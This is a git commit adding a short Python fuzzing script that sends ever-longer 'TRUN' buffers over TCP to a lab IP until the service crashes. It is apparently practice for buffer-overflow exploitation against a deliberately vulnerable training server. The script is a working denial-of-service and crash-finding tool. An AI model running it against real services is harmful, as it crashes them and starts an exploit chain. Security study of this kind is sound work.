23431c7b1fff2b65726a6ebbba6a21016cbda29a
Munene <jmunene.dev@gmail.com>
2022-09-18 20:09:25 +0300

    first-commit

---
+++ Buffer-Overflow/fuzz.py
@@ -0,0 +1,27 @@
+#! /usr/bin/python
+
+import sys
+import socket
+from time import sleep
+
+IP ='10.6.51.255'
+port = 9999
+
+buffer ="A" * 100
+
+
+while True:
+        try:
+               s =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+               s.connect((IP,port))
+               trun ='TRUN /.:/'
+               s.send((trun.encode() + buffer.encode()))
+               s.close()
+         
+               sleep(1)
+               buffer = buffer + "A" *100
+
+        except:
+              print("Your buffer crashed the program at %s bytes" % str(len(buffer)))
+              sys.exit()
+        
